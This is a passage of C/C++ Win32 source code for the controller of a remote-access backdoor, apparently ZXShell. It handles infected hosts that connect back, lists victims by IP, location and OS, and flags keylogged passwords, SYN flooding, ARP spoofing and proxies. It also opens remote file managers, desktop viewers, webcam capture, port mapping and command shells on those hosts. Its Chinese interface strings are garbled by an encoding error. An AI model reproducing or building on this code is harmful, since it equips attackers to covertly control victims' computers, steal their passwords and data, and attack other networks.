	LVITEM lv;
	int idx=0;
	int next;
	HWND hDlg = Main.hWnd;

	int total = SendDlgItemMessage(hDlg, IDC_ONLINE, LVM_GETITEMCOUNT, 0, 0);
	next = -1;
	while(1)
	{
		memset(&lv, 0, sizeof(LVITEM));
		lv.mask = LVIF_PARAM;
		lv.iSubItem		= 0;
		lv.iItem = idx;

		if(!SendDlgItemMessage(hDlg, IDC_ONLINE, LVM_GETITEM, 0, LPARAM(&lv)))
			return -1;

		if(s == (SOCKET)lv.lParam)
		{
			return idx;
		}
		idx++;
/*
		idx = SendDlgItemMessage(hDlg, IDC_ONLINE, LVM_GETNEXTITEM, next, LVNI_ALL);

		if(idx == -1)
			return -1;
		next = idx;

		memset(&lv, 0, sizeof(LVITEM));
		lv.mask = LVIF_PARAM;
		lv.iSubItem		= 0;
		lv.iItem = idx;

		if(SendDlgItemMessage(hDlg, IDC_ONLINE, LVM_GETITEM, 0, LPARAM(&lv)) <= 0)
			return -1;

		if(s == (SOCKET)lv.lParam)
		{
			return idx;
		}
*/
	}

	return -1;
}

void AddItems(SOCKET s, char *Msg, DWORD funmask)
{
	CEventLock lock(evLock);

	char pszText[32] = {0}, szIP[32] = {0}, szLocality[MAX_PATH] = {0};
	char shellver[10] = {0};
	char AtTime[100] = {0};
	char otherFun[256] = {0};
	float fShellVersion = g_ShellList.GetShellVersion(s);


	SYSTEMTIME st;
	struct sockaddr_in client;
	int structsize=sizeof(struct sockaddr);
	if(getpeername(s,(struct sockaddr *)&client,&structsize)<0)
		sprintf(szIP, "Unknown");
	else
	{
#if defined _DEBUG
		srand( (unsigned)GetTickCount()+g_ShellList.GetCount() );
		sprintf(szIP, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
#else
		sprintf(szIP, "%s", inet_ntoa(client.sin_addr));
#endif
	}

	LocalityFromIP2(szIP, szLocality);

	SYSTEMTIME stm;
	GetLocalTime(&stm);
	sprintf(
		AtTime,
		"%04u.%02u.%02u-%02u:%02u:%02u",
		stm.wYear, stm.wMonth, stm.wDay,
		stm.wHour, stm.wMinute, stm.wSecond
		);

	char *HostName = Msg;
	char *System = strstr(Msg, " OS: ");
	if(System == NULL)
		System = "Unknown";
	else
	{
		*System = '\0';
		System += 5;
	}
#if defined _DEBUG
	sprintf(shellver, "%.2f", fShellVersion+float(g_ShellList.GetCount()%2?0.1:0));
#else
	sprintf(shellver, "%.2f", fShellVersion);
#endif

	if(fShellVersion >= (float)3.1)
	{
		sprintf(otherFun, 
			"����ͷ: %s | "
			//"vnc���: %s | "
			"�Զ�����: %s | "
			"��¼����: %s | "
			"SYNFlood: %s | "
			"ZXARPS: %s | "
			"�ն˷���: %s | "
			"http����: %s | "
			"http����: %s | "
			"sock����: %s"
			, 
			funmask&CAPDEVICE?"��":"��",
		//funmask&VNCPLUGIN?"��":"��",
			funmask&ZXPLUGIN?"��":"��",
			funmask&KEYLOGPASSWORD?"��":"��",
			funmask&MASK_SYNFLOOD?"����":"ֹͣ",
			funmask&MASK_ZXARPSPOOF?"����":"ֹͣ",
			funmask&TERMSERVICE?"����":"�ر�",
			funmask&ZXHTTPSRV?"����":"�ر�",
			funmask&ZXHTTPPROXY?"����":"�ر�",
			funmask&ZXSOCKPROXY?"����":"�ر�"

			);
	}

	int ret;
	HWND hDlg = Main.hWnd;
	HWND hCtrl = GetDlgItem(hDlg, IDC_ONLINE);
	LVITEM	Lv = {0};
	Lv.mask			= LVIF_TEXT|LVIF_PARAM;
	Lv.iItem		= 0;

	Lv.lParam = (LPARAM) s;

	Lv.iSubItem		= 0;
#if defined _DEBUG
	char fakeHostName[256];
	sprintf(fakeHostName, "ZXSHELL %d", rand()%1000);
	Lv.pszText		= fakeHostName;
#else
	Lv.pszText		= HostName;
#endif
	ret = SendMessage(hCtrl, LVM_INSERTITEM , 0,  (LPARAM)&Lv);

	Lv.mask			= LVIF_TEXT;
	Lv.iSubItem		= 1;
	Lv.pszText		= szIP;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);
	Lv.iSubItem		= 2;
	Lv.pszText		= szLocality;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);

	Lv.iSubItem		= 3;
	Lv.pszText		= shellver;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);

	Lv.iSubItem		= 4;
	Lv.pszText		= AtTime;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);

	Lv.iSubItem		= 5;
	Lv.pszText		= System;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);
	
	Lv.iSubItem		= 6;
	Lv.pszText		= otherFun;
	ret = SendMessage(hCtrl, LVM_SETITEM , 0, (LPARAM)&Lv);
	
	if(SoundNotify)
		sndPlaySound(lpMemSound_IN, SND_MEMORY|SND_ASYNC);
	return;
}

void DelItems(SOCKET s)
{
	CMutexLock lock(mxLock);

	int idx;
	HWND hDlg = Main.hWnd;

	idx = GetHostItemIdxBySocket(s);
	if(idx == -1)
		return;

	SendDlgItemMessage(hDlg, IDC_ONLINE, LVM_DELETEITEM, idx, 0);
	if(SoundNotify)
		sndPlaySound(lpMemSound_OUT,SND_MEMORY|SND_ASYNC);
	return;
}

void TakeOutHostName(char ch, char *In, char *Out)
{
	while(*In && *In != ch)
	{
		*(Out++) = *(In++);
	}
	*Out = '\0';
}

bool Send_ACK(SOCKET Socket, BYTE b)
{
	SetSocketToBlocking(Socket);
	return send(Socket, (char*)&b, 1, 0) == 1;
}

bool Recv_ACK(SOCKET Socket, BYTE b)
{
	BYTE ack;
	SetSocketToBlocking(Socket);
	if(recv(Socket, (char*)&ack, 1, 0) == 1)
	{
		if(ack == b)
			return true;
	}
	return false;
}


int RecvLine(SOCKET Socket, char *RecvBuf, int BufSize, int nTimeOut)
{
    int nRetVal = 0;
	int cmdlen = 0;
	while(cmdlen < BufSize)
	{
		nRetVal = SetTimeOut(Socket, nTimeOut);
		if(nRetVal == SOCKET_ERROR)
		{
			return 0;
		}else if(nRetVal == 0)
		{
			return 0;
		}
		nRetVal = recv(Socket, RecvBuf+cmdlen, 1, 0);
		if(nRetVal <= 0)
			return 0;
		RecvBuf[cmdlen+nRetVal] = '\0';
		//////////////
		cmdlen += nRetVal;
		if(cmdlen >= 2)
		{
			if(RecvBuf[cmdlen-2] == '\r' && RecvBuf[cmdlen-1] == '\n')
			{
				RecvBuf[cmdlen-2] = '\0';
				return cmdlen - 2;
			}
		}
	}
    return 0;
}
/*
bool DoActions(SOCKET Socket, char *RecvBuf, int Action)
{
	BYTE ZX_ACK = *RecvBuf;
	bool ret = false;
	if(ZX_ACK != 0xF4)
		return ret;

	SOCKET connSocket;
	SOCKINFO socks;

	g_Socket_Actions.AddSocket(Socket);

	switch(Action)
	{
	case FILEMANAGER:
		Send_ACK(Socket, 0xF4);
		DialogBoxParam(Main.hInst, (LPCTSTR)IDD_FILEMANAGER, NULL, (DLGPROC)FileManagerDlgProc, Socket);
		ret = true;
		break;
	case TELHELP:

		ret = true;
		connSocket = ConnectHost("127.0.0.1", vncPort);
		if(!connSocket)
		{
			OutPutResult("����vncviewerʧ��,ִ�б�����ǰȷ���Ѿ���-listen port����������vncviewer\r\n");
			break;
		}

		socks.Key = 0;
		socks.ClientSock = Socket;
		socks.ServerSock = connSocket;

		Send_ACK(Socket, 0xF4);
		OutPutResult("��vncviewer���ӳɹ�.\r\n");
		TransmitData((LPVOID)&socks);
		closesocket(connSocket);
		Send_ACK(Socket, 0x88);
		OutPutResult("vncviewer���ӶϿ�.\r\n");
		break;

	}

	g_Socket_Actions.DelSocket(Socket);
	
	return ret;
}
*/
bool LaunchVNCviewer()
{
	HWND hwnd = FindWindow("VNCviewer Daemon", NULL);
	if(hwnd)
	{
		SOCKET connSocket = ConnectHost("127.0.0.1", 52880);
		if(connSocket){
			closesocket(connSocket);
			return true;
		}
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	char VNCviewerFile[MAX_PATH];
	GetModuleFileName(NULL, VNCviewerFile, sizeof(VNCviewerFile));
	PathRemoveFileSpec(VNCviewerFile);
	strcat(VNCviewerFile, "\\VNCviewer.exe -listen 52880 /scale 4/5 /viewonly");
	if(WinExec(VNCviewerFile, SW_MINIMIZE) > 31)
	{
		Sleep(300);
		if(FindWindow("VNCviewer Daemon", NULL))
			return true;
		else
		{
			OutPutResult("����VNCviewerʧ��, ���ֶ���-listen 52880��������vncviewer\r\n");
			return false;
		}
	}
	OutPutResult("����VNCviewerʧ��, ���ֶ���-listen 52880��������vncviewer\r\n");
	return false;
}

bool AutoWinVNC(SOCKET Socket)
{
	//��Ȿ��vncviewer�Ƿ������˿��Ƿ���

	if(!LaunchVNCviewer()){
		closesocket(Socket);
		return false;
	}

	SOCKET connSocket = ConnectHost("127.0.0.1", 52880);
	if(!connSocket)
	{
		OutPutResult("����VNCviewerʧ��,ִ�б�����ǰȷ���Ѿ���-listen 52880����������vncviewer\r\n");
		closesocket(Socket);
		return false;
	}

	SOCKINFO socks;
	socks.Key = 0;
	socks.ClientSock = connSocket;
	socks.ServerSock = Socket;

	OutPutResult("��VNCviewer�����ѽ���, ���Ե�.\r\n");
	TransmitData((LPVOID)&socks);
	closesocket(connSocket);
	closesocket(Socket);
	OutPutResult("VNCviewer���ӶϿ�.\r\n");
	return true;
}

//��ʼԶ��������
int CreateRemoteDesktopViewer(SOCKET Socket)
{
	RDVIEWER rdv(Socket);

	_tagConnInfo *pCI = g_CmdConnList.IsSocketInList(Socket);
	if(pCI == NULL)
		return FALSE;

	int ret = GetHostItemIdxBySocket(pCI->parentSocket);
	char *content = NULL;
	CopyHostInfo(GetDlgItem(Main.hWnd, IDC_ONLINE), ret, 0, 2, &content);
	if(content)
	{
		rdv.SetDisplayWinTitle(content);
		free(content);
	}

	rdv.CreateDisplay();

	rdv.RecvMessage();
	//rdv.msgloop();

	closesocket(Socket);

	return 0;
}

DWORD connControl(SOCKET Socket, char *RecvBuf, int bufsize)
{
	int nRetVal;

	SetSocketToBlocking(Socket);
	nRetVal = recv(Socket, RecvBuf, bufsize-1, 0);
	if(nRetVal <= 0)//����������0�����������ر�socket
		return 0;

	RecvBuf[nRetVal] = '\0';

	return Send_ACK(Socket, 0xF4);//���õ�ȷ�ϰ�


	//��������1
	//return 1;

exit:
	nRetVal = WSAGetLastError();

	return 0;
}

DWORD WINAPI ShellThread(LPVOID lParam)
{
	SOCKET Socket = (SOCKET)lParam;

	int nRetVal;
	MASTER auth;

	MASTER Master;
	Master.MainFlag = 0x1985;
	Master.SubFlag = 0x0425;
	Master.Version = CTRLVERSION;
	Master.Action = 0;

	Send(Socket, (char*)&Master, sizeof(MASTER), 12, 0);

	nRetVal = Recv(Socket, (char*)&Master, sizeof(MASTER), 12, 0);
	if(nRetVal <= 0)
		goto exit;

	if(Master.MainFlag != 0x1986 || Master.SubFlag != 0x0104)
		goto exit;

	if(Master.Version >= (float)3.1)
	{
		auth.MainFlag = PasswdCRC32;
		auth.SubFlag = Socket;//�׽����ڱ����ǲ��ظ��ģ�ֱ������ΪΨһID
		auth.Version = 0;
		auth.Action = 0;

		Send(Socket, (char*)&auth, sizeof(MASTER), 12, 0);

		nRetVal = Recv(Socket, (char*)&auth, sizeof(MASTER), 12, 0);
		if(nRetVal <= 0)
			goto exit;

		if(auth.MainFlag != 0)
		{
			sprintf(TempBuf, "%s Э��ʱ��֤����ʧ��.\r\n", GetPeerIPStr(Socket));
			OutPutResult(TempBuf);
			goto exit;
		}
		//���������ӣ����������ӵ�SubFlag������һ��client���ڽ�����������ʱ����server��ΨһID
		if(Master.Action != action_Online)
		{
			if(auth.SubFlag == 0)
			{
				sprintf(TempBuf, "%s Э��ʧ��, �ܾ�����.\r\n", GetPeerIPStr(Socket));
				OutPutResult(TempBuf);
				goto exit;
			}else
			{
				_CZXServer *zxserver = g_ShellList.IsSocketInList(auth.SubFlag);
				if(zxserver == NULL)
				{
					sprintf(TempBuf, "%s Э��ʧ��, �ܾ�����.\r\n", GetPeerIPStr(Socket));
					OutPutResult(TempBuf);
					goto exit;
				}
				
				_tagConnInfo ci;

				ci.parentSocket = auth.SubFlag;
				ci.Socket = Socket;

				g_CmdConnList.AddSocket(ci);
			}
		}

	}

	if(Master.Action == action_Online)
	{
		//�������ߵ���������auth.SubFlag����������һЩ���ܲ���

		_CZXServer zxserver;
		char HostInfo[MAXBUFSIZE];
		if(!connControl(Socket, HostInfo, MAXBUFSIZE))
			goto exit;

		zxserver.Socket = Socket;
		zxserver.ver = Master.Version;
		zxserver.funmask = auth.SubFlag;

		g_ShellList.AddSocket(zxserver);

		AddItems(Socket, HostInfo, auth.SubFlag);

		if(WSAAsyncSelect(Socket, hWndSocket, WM_SOCKET, FD_READ|FD_WRITE|FD_CLOSE) == SOCKET_ERROR)
		{
			PostMessage(hWndSocket, WM_SOCKET, Socket, FD_CLOSE);
		}

		return 1;
	}else if(Master.Action == action_FileMG)
	{
		OutPutResult("�ļ����� �������ѽ���.\r\n");
		DialogBoxParam(Main.hInst, (LPCTSTR)IDD_FILEMANAGER, NULL, (DLGPROC)FileManagerDlgProc, Socket);
		OutPutResult("�ļ����� ���ӶϿ�.\r\n");
	}else if(Master.Action == action_WinVNC)
	{
		OutPutResult("Զ������ �������ѽ���.\r\n");
		AutoWinVNC(Socket);
	}else if(Master.Action == action_RDSRV)
	{
		OutPutResult("Զ������ �������ѽ���.\r\n");
		CreateRemoteDesktopViewer(Socket);
		OutPutResult("Զ������ ���ӶϿ�.\r\n");
	}else if(Master.Action == action_PORTMAP)
	{
		OutPutResult("�˿�ӳ�� �������ѽ���.\r\n");
		DialogBoxParam(Main.hInst, (LPCTSTR)IDD_PORTMAP, NULL, (DLGPROC)PortMapDlgProc, Socket);
		OutPutResult("�˿�ӳ�� ���ӶϿ�.\r\n");
	}else if(Master.Action == action_GETCMD)
	{
		OutPutResult("������ʾ�� �������ѽ���.\r\n");
		Startup_GETCMD(Socket);
		OutPutResult("������ʾ�� ���ӶϿ�.\r\n");
	}else if(Master.Action == action_CAPSRV)
	{
		OutPutResult("��Ƶ���� �������ѽ���.\r\n");
		DialogBoxParam(Main.hInst, (LPCTSTR)IDD_CAPVIEWER, NULL, (DLGPROC)RemoteCapDlgProc, Socket);
		OutPutResult("��Ƶ���� ���ӶϿ�.\r\n");
	}

	g_CmdConnList.DelSocket(Socket);

	return 1;
exit:
	ForceCloseSocket(Socket);
	return 0;
}

void ProcessSocketMessage(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	_CZXServer *zxserver;
	char RecvBuff[8192];
	SOCKET AcceptSocket;
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	int retval = 0;
	HANDLE hThread;
	DWORD dwThreadID;
	if(WSAGETSELECTERROR(lParam)){
		PostMessage(hWnd, WM_SOCKET, wParam, FD_CLOSE);
		return;
	}

	switch(WSAGETSELECTEVENT(lParam)){
	case FD_ACCEPT:

		AcceptSocket = accept(wParam, (SOCKADDR *)&clientaddr, &addrlen);

		if(AcceptSocket == INVALID_SOCKET){
			return;
		}

		if(bServicePaused)
			closesocket(AcceptSocket);

		retval = WSAAsyncSelect(AcceptSocket, hWnd, 0, 0);
		if(retval == SOCKET_ERROR){
			closesocket(AcceptSocket);
			return;
		}
		SetSocketToBlocking(AcceptSocket);
		retval = TurnOnKeepAlive(AcceptSocket, 56*1000, 15000);
		hThread = CreateThread(NULL, NULL, ShellThread, (LPVOID)AcceptSocket, 0, &dwThreadID);
		if(hThread == NULL)
			closesocket(AcceptSocket);
		else
			CloseHandle(hThread);

		break;

	case FD_READ:

		retval = recv(wParam, RecvBuff, sizeof(RecvBuff)-1, 0);
		if(retval <= 0)
		{
			//���ӳ���,post FD_CLOSE
			PostMessage(hWnd, WM_SOCKET, wParam, FD_CLOSE);
			break;
		}
		RecvBuff[retval] = '\0';

		zxserver = g_ShellList.IsSocketInList(wParam);
		if(zxserver)
		{
			if(zxserver->hOutPutDlg2)
			{
				OutPutResult(RecvBuff, zxserver->hOutPutDlg2);
				break;
			}
		}

		OutPutResult(RecvBuff);

		break;

	case FD_WRITE:

		zxserver = g_ShellList.IsSocketInList(wParam);
		if(zxserver == NULL)
		{
			//����������,post FD_CLOSE
			PostMessage(hWnd, WM_SOCKET, wParam, FD_CLOSE);
		}else
		{
			if(!zxserver->Send())
				PostMessage(hWnd, WM_SOCKET, wParam, FD_CLOSE);
		}
		break;

	case FD_CLOSE:

		//closesocket(wParam);
		ForceCloseSocket(wParam);
		DelItems(wParam);
		g_ShellList.DelSocket(wParam);


		break;
	}
}
/*
void GetDropFile(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

	char szRemoteFile[MAX_PATH];
	SOCKET Socket;

	if(SendMessage(GetDlgItem(Main.hWnd, IDC_ONLINE), LVM_GETSELECTEDCOUNT, 0, 0) == 0)
	{
		MessageBox(Main.hWnd, "����ѡ��һ��������? (���Զ�ѡ)", "����", MB_ICONERROR);
		return;
	}

	if(!DragQueryFile((HDROP)wParam, 0, szLocalFile, sizeof(szLocalFile)))
		return;

	strcpy(szRemoteFile, szLocalFile);
	PathStripPath(szRemoteFile);

	Action = UPLOAD;

	nextHostIdx = -1;
	while(GetSelectedItems(&Socket))
	{
		UploadFile(Socket, szLocalFile, szRemoteFile);
	}

	return;
}
*/

/*
HBITMAP GetMenuBMP(int IDB_code)
{
	int x,y;
	BOOL bRet;
	SIZE size;

	x = GetSystemMetrics(SM_CXMENUCHECK);
	y = GetSystemMetrics(SM_CYMENUCHECK);
	HDC hMemDC1 = CreateCompatibleDC(0);
	HDC hMemDC2 = CreateCompatibleDC(0);

	HBITMAP hBitmap1 = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_code));
	if(SelectObject(hMemDC1, hBitmap1) == NULL)
	{
		bRet = FALSE;
	}
	bRet = GetBitmapDimensionEx(hBitmap1, &size);
	bRet = GetLastError();

	HBITMAP hBitmap2 = CreateCompatibleBitmap(hMemDC2, x, y);
	if(SelectObject(hMemDC2, hBitmap2) == NULL)
	{
		bRet = FALSE;
	}

	DeleteDC(hMemDC1);
	DeleteDC(hMemDC2);
	return (HBITMAP)SelectObject(hMemDC2, hBitmap2);
}
*/
//���ļ��������Ҽ��˵��в���ͼ��
void AddBmp2MenuItems(HMENU hMenu)
{
	HBITMAP hBitmap;

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_CDUP));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_CDUP, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_DEL));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_DELETE, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_DNLOAD));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_DNLOAD, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_MD5));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_XMD5, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_MOVE));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_MOVE, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_NEWDIR));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_NEWDIR, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_REFRESH));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_REFRESH, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_RENAME));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_RENAME, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_EXECUTE));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_EXECUTE, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_UPLOAD));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_UPLOAD, MF_BYCOMMAND, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_PLUG));
	SetMenuItemBitmaps(hMenu, 14, MF_BYPOSITION, hBitmap, hBitmap);

	hBitmap = LoadBitmap(Main.hInst, MAKEINTRESOURCE(IDB_SEARCH));
	SetMenuItemBitmaps(hMenu, ID_MENUITEM_SEARCH, MF_BYCOMMAND, hBitmap, hBitmap);
}
//���б������ֵ�����
int CALLBACK SortListViewCompareFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	int idx1=lParam1,idx2=lParam2;

	NMLISTVIEW *pnmh = (NMLISTVIEW *)lParamSort;

	LVITEM lv1,lv2;
	int idx;
	int next;
	char pszText1[MAX_PATH] = {0};
	char pszText2[MAX_PATH] = {0};
	HWND hDlg = Main.hWnd;

	memset(&lv1, 0, sizeof(LVITEM));
	memset(&lv2, 0, sizeof(LVITEM));
	lv1.mask = lv2.mask = LVIF_TEXT;
	lv1.iSubItem = lv2.iSubItem = pnmh->iItem;
	lv1.pszText = pszText1;
	lv2.pszText = pszText2;
	lv1.cchTextMax = lv2.cchTextMax = MAX_PATH;

	lv1.iItem = idx1;
	lv2.iItem = idx2;

	if(!SendMessage(GetParent(pnmh->hdr.hwndFrom), LVM_GETITEM, 0, LPARAM(&lv1)))
		return 1;
	if(!SendMessage(GetParent(pnmh->hdr.hwndFrom), LVM_GETITEM, 0, LPARAM(&lv2)))
		return -1;

	return stricmp(lv1.pszText, lv2.pszText);
}

//���ļ���������������ʾ�ļ���LISTVIEW�ؼ��Ĵ�������
int CALLBACK FileListCtrlProc(HWND hCtrl, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	int ret, i;
	char szBuf[MAX_PATH];
	char szFileName[MAX_PATH];
	HWND hDlg = GetParent(hCtrl);
	HMENU hMenu;
	POINT pt;

	WNDPROC OldMsgProc = (WNDPROC)GetWindowLong(hCtrl, GWL_USERDATA);
	CFileManager *pFileMng = (CFileManager*)GetWindowLong(hDlg, GWL_USERDATA);
	switch(uMsg)
	{
	case WM_INITDIALOG:
		return TRUE;

	case WM_NOTIFY:
		{
			NMHDR *pnhdr = (NMHDR*)lParam;
			//���������ļ�
			if(pnhdr->code == 0xfffffebe)//left mouse click
			{
				NMLISTVIEW *pnmh;

				pnmh = (LPNMLISTVIEW)lParam;
				//sprintf(TempBuf, "%x %d\r\n", pnmh->hdr.code, pnmh->iItem);
				//OutPutResult(TempBuf);
				int ret = ListView_SortItemsEx(hCtrl, SortListViewCompareFunc, lParam);
			}

		}
		break;

	case WM_DROPFILES:
		ret = DragQueryFile((HDROP)wParam, 0xFFFFFFFF, szFileName, sizeof(szFileName));
		if(ret)
		{
			for(i=0; i<ret; i++)
			{
				if(DragQueryFile((HDROP)wParam, i, szFileName, sizeof(szFileName)))
				{
					UpLoadFile(hDlg, szFileName, pFileMng);
				}
			}
			DragFinish((HDROP)wParam);
			sndPlaySound(lpMemSound_Notify, SND_MEMORY|SND_ASYNC);
		}
		break;

	case WM_CONTEXTMENU://�Ҽ��ɿ��¼�

		hMenu = LoadMenu(Main.hInst, MAKEINTRESOURCE(IDR_FILEMG_MENU));
		//�˵���ǰ����ͼ��
		AddBmp2MenuItems(GetSubMenu(hMenu, 0));
		if(hMenu)
		{
			GetCursorPos(&pt);
			if(pFileMng->GetServerVer() <= 3.10)
			{
				ret = EnableMenuItem(GetSubMenu(hMenu, 0), ID_MENUITEM_SEARCH, MF_BYCOMMAND|MF_DISABLED|MF_GRAYED);
			}

			TrackPopupMenu(GetSubMenu(hMenu, 0), 
				TPM_LEFTBUTTON, 
				pt.x, 
				pt.y,
				0,
				hCtrl,
				0);

			DestroyMenu(hMenu);
		}

		break;

	case WM_LBUTTONDBLCLK:
		{
			int nextFileIdx = -1;
			if(GetSelectedFiles(hDlg, szFileName, nextFileIdx))
			{
				GetDlgItemText(hDlg, IDC_DIRPATH, szBuf, sizeof(szBuf));//���Ŀǰ·��
				SetDlgItemText(hDlg, IDC_DIRPATH, szFileName);

				if(GetFileList(hDlg, pFileMng) == -1)//·����Ч���˻���һ��
				{
					SetDlgItemText(hDlg, IDC_DIRPATH, szBuf);//��ԭ·��
					err_display(GetDlgItem(hDlg, IDC_ERRMSG), 0, pFileMng->GetError());
				}

			}
		}
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case ID_MENUITEM_CDUP:
			if(GetDlgItemText(hDlg, IDC_DIRPATH, szFileName, MAX_PATH))
			{
				sprintf(TempBuf, "%s\\..\\", szFileName);
				FormatPathString(TempBuf, szFileName, MAX_PATH, true);
				GetDlgItemText(hDlg, IDC_DIRPATH, szBuf, MAX_PATH);//���Ŀǰ·��
				SetDlgItemText(hDlg, IDC_DIRPATH, szFileName);//����Ϊ��һ��·��
				if(GetFileList(hDlg, pFileMng) == -1)
				{
					err_display(GetDlgItem(hDlg, IDC_ERRMSG), 0, pFileMng->GetError());
					SetDlgItemText(hDlg, IDC_DIRPATH, szBuf);//����ļ��б����������û�ԭ����·��
				}
			}

			break;
		case ID_MENUITEM_REFRESH:
			if(GetFileList(hDlg, pFileMng) == -1)
			{
				err_display(GetDlgItem(hDlg, IDC_ERRMSG), 0, pFileMng->GetError());
			}
			break;
		case ID_MENUITEM_UPLOAD:
			if(!GetDirPath(hDlg, 1, szFileName))
			{
				err_display(GetDlgItem(hDlg, IDC_ERRMSG), 0, ERROR_CANCELLED);
				break;
			}
			if(UpLoadFile(hDlg, szFileName, pFileMng) != -1)
				sndPlaySound(lpMemSound_Notify, SND_MEMORY|SND_ASYNC);
			break;
		case ID_MENUITEM_DNLOAD:
			if(DownLoadFile(hDlg, pFileMng) != -1)
				sndPlaySound(lpMemSound_Notify, SND_MEMORY|SND_ASYNC);
			break;
		case ID_MENUITEM_MOVE:
			MoveFile(hDlg, pFileMng);
			break;
		case ID_MENUITEM_DELETE:
			if(DeletePath(hDlg, pFileMng))
				sndPlaySound(lpMemSound_Recycle, SND_MEMORY|SND_ASYNC);
			else
				sndPlaySound(lpMemSound_Error, SND_MEMORY|SND_ASYNC);
			break;
		case ID_MENUITEM_RENAME:
			{

				int nextFileIdx = -1, currFileIdx; 
				currFileIdx = GetSelectedFiles(hDlg, szFileName, nextFileIdx);
				if(!currFileIdx)
					break;
				currFileIdx--;
				//���ͱ༭��ǩ��Ϣ
				ListView_EditLabel(hCtrl, currFileIdx);
				
			}
			break;
		case ID_MENUITEM_EXECUTE:
			ExecuteFile(hDlg, pFileMng);
			break;
		case ID_MENUITEM_NEWDIR:
			NewFolder(hDlg, pFileMng);
			break;
		case ID_MENUITEM_XMD5:
			GetMd5string(hDlg, pFileMng);
			break;
		case ID_MENUITEM_PLUG_VNC:
			SetPlugPath_VNC(hDlg, pFileMng);
			break;
		case ID_MENUITEM_SEARCH:
			RemoteSearchFile(hDlg, pFileMng);
			break;
		}
	}
	return CallWindowProc(OldMsgProc, hCtrl, uMsg, wParam, lParam);
}


//�ļ����� ���ڵ�����Сʱ�Կؼ�λ�õĵ���
BOOL CALLBACK FileManagerPositionChildProc(HWND hwndChild, LPARAM lParam) 
{ 
    LPRECT rcParent; 
	POINT ptMe;
	POINT ptMap;
	RECT rcMe;
	RECT rcMap, rcup,rcdown;
    int i, idChild;
	int x,y,w,h,l,r;

	HWND hDlg = (HWND)lParam;

	if(GetParent(hwndChild) != hDlg)
		return TRUE;
 
    // Retrieve the child-window identifier. Use it to set the 
    // position of the child window. 
 
    idChild = GetWindowLong(hwndChild, GWL_ID); 
 
    if (idChild == IDC_STATIC_RPATH) 
    {
  		GetWindowRect(hwndChild, &rcMe);

		MoveWindow(hwndChild, 
				   10, 
				   13, 
				   rcMe.right-rcMe.left, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 

	}
    else if (idChild == IDC_FILEMG_GO)
    {
		GetWindowRect(hDlg, &rcMap);
  		GetWindowRect(hwndChild, &rcMe);
		ptMe.x = rcMap.right-(rcMe.right-rcMe.left)-20;
		ptMe.y = rcMap.top;
		ScreenToClient(hDlg, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x, 
				   8,
				   rcMe.right-rcMe.left, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 

	}
    else if (idChild == IDC_ABORT)
    {
		GetWindowRect(GetDlgItem(hDlg,IDC_FILEMG_GO), &rcMap);
  		GetWindowRect(hwndChild, &rcMe);
		ptMe.x = rcMap.left;
		ptMe.y = rcMap.bottom+(rcMap.bottom-rcMap.top);
		ScreenToClient(hDlg, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x, 
				   ptMe.y,
				   rcMe.right-rcMe.left, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 

	}  
	else if (idChild == IDC_DIRPATH) 
    {
   		GetWindowRect(GetDlgItem(hDlg,IDC_STATIC_RPATH), &rcMap);
 		GetWindowRect(hwndChild, &rcMe);
		ptMap.x = rcMap.right+3;
		ptMap.y = rcMap.top;
		ScreenToClient(hDlg, &ptMap);

		h = rcMe.bottom-rcMe.top;
		l = rcMap.right+3;

		GetWindowRect(GetDlgItem(hDlg,IDC_FILEMG_GO), &rcMap);

		r = rcMap.left-3;
		w = r - l;

		MoveWindow(hwndChild, 
				   ptMap.x, 
				   10, 
